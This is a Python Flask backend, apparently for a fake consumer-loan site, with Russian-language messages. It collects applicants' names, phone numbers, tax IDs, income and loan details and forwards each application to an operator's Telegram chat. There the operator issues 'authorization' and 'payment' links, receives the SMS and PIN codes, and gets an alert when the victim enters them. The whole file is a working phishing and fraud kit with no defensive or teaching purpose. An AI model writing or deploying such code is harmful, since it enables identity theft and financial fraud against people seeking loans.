import os
import sqlite3
import secrets
import random
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # ← важно!

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru")

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS applications
                 (id INTEGER PRIMARY KEY, fullname TEXT, phone TEXT, inn TEXT,
                  income REAL, term INTEGER, amount REAL, payment REAL,
                  session_id TEXT, status TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (session_id TEXT PRIMARY KEY, phone TEXT, sms_code TEXT, pin_code TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ========== ОТПРАВКА В TELEGRAM ==========
def send_to_admin(text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = keyboard
    requests.post(url, json=data)

def get_keyboard(session_id):
    return {
        "inline_keyboard": [
            [{"text": "🔐 Ссылка на авторизацию", "callback_data": f"auth:{session_id}"}],
            [{"text": "💳 Ссылка на оплату", "callback_data": f"payment:{session_id}"}],
            [{"text": "❌ Отклонить", "callback_data": f"reject:{session_id}"}]
        ]
    }

# ========== ОБРАБОТКА КНОПОК ==========
def send_callback_answer(callback_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    requests.post(url, json={"callback_query_id": callback_id, "text": text})

def edit_message_text(chat_id, message_id, new_text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": new_text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = keyboard
    requests.post(url, json=data)

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    if 'callback_query' in data:
        callback = data['callback_query']
        callback_id = callback['id']
        chat_id = callback['message']['chat']['id']
        message_id = callback['message']['message_id']
        callback_data = callback['data']
        
        if callback_data.startswith('auth:'):
            session_id = callback_data.split(':')[1]
            link = f"{SITE_URL}/page_82554/?session={session_id}"
            send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}", None)
            
        elif callback_data.startswith('payment:'):
            session_id = callback_data.split(':')[1]
            link = f"{SITE_URL}/page_63860/?session={session_id}"
            send_callback_answer(callback_id, "✅ Ссылка на оплату")
            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}", None)
            
        elif callback_data.startswith('reject:'):
            session_id = callback_data.split(':')[1]
            send_callback_answer(callback_id, "❌ Заявка отклонена")
            edit_message_text(chat_id, message_id, f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}", None)
            
            conn = sqlite3.connect('applications.db')
            c = conn.cursor()
            c.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
            conn.commit()
            conn.close()
    
    return jsonify({"status": "ok"})

# ========== ОСНОВНЫЕ ЭНДПОИНТЫ ==========
@app.route('/submit_credit_application', methods=['POST'])
def submit_application():
    data = request.json
    session_id = secrets.token_hex(8)
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('''INSERT INTO applications (fullname, phone, inn, income, term, amount, payment, session_id)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (data['fullname'], data['phone'], data.get('inn', ''), data['income'],
               data['term'], data['amount'], data['payment'], session_id))
    conn.commit()
    conn.close()
    
    msg = f"""🆕 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>

👤 ФИО: {data['fullname']}
📱 Телефон: {data['phone']}
🆔 ИНН: {data.get('inn', '—')}
💰 Сумма: {data['amount']} BYN
📅 Срок: {data['term']} мес
💳 Платёж: ~{data['payment']} руб

🆔 Сессия: <code>{session_id}</code>"""
    
    send_to_admin(msg, get_keyboard(session_id))
    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    data = request.json
    session_id = data['session_id']
    phone = data['phone']
    sms_code = str(random.randint(10000, 99999))
    pin_code = str(random.randint(1000, 9999))
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone, sms_code, pin_code) VALUES (?, ?, ?, ?)',
              (session_id, phone, sms_code, pin_code))
    conn.commit()
    conn.close()
    
    send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ</b>\n\nСессия: <code>{session_id}</code>\n📞 {phone}\n\n🔐 SMS: <code>{sms_code}</code>\n🔢 PIN: <code>{pin_code}</code>")
    return jsonify({"status": "ok"})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.json
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT sms_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
    row = c.fetchone()
    conn.close()
    if row and row[0] == data['code']:
        return jsonify({"status": "ok", "next_step": "pin"})
    return jsonify({"status": "error", "message": "Неверный код"})

@app.route('/submit_pin', methods=['POST'])
def submit_pin():
    data = request.json
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT pin_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
    row = c.fetchone()
    conn.close()
    if row and row[0] == data['pin']:
        send_to_admin(f"✅ <b>АВТОРИЗАЦИЯ УСПЕШНА!</b>\n\nСессия: <code>{data['session_id']}</code>")
        return jsonify({"status": "ok", "authorized": True})
    return jsonify({"status": "error", "message": "Неверный PIN"})

@app.route('/')
def home():
    return "✅ API работает"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
